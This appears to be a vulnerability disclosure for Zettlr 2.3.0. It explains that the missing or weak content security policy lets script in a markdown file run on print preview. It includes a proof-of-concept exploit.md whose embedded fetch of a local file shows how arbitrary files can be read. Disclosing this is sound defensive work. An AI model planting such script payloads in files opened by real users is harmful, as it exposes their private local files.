## Description

Zettlr version 2.3.0 allows an external attacker to remotely obtain
arbitrary local files on any client that attempts to view a malicious
markdown file through Zettlr. This is possible because the application
does not have a CSP policy (or at least not strict enough) and/or does
not properly validate the contents of markdown files before rendering
them.

## Vulnerability

This vulnerability occurs because the application does not have a CSP
policy (or at least not strict enough) and/or does not properly validate
the contents of markdown files before rendering them. Because of the above,
an attacker can embed malicious JS code in a markdown file and send it to
the victim to view and thus achieve an exfiltration of their local files.

More about this functionality here: <https://docs.zettlr.com/en/core/print-preview/>

## Exploitation

To exploit this vulnerability, you must send the following file to a
user to open with Zettlr. The exploit is triggered when the user
presses `CTRL+P` or simply clicks `print`.

### exploit.md

```
<script>fetch("file:///etc/private").then(response => response.text()).then(leak => alert(leak))</script>

```
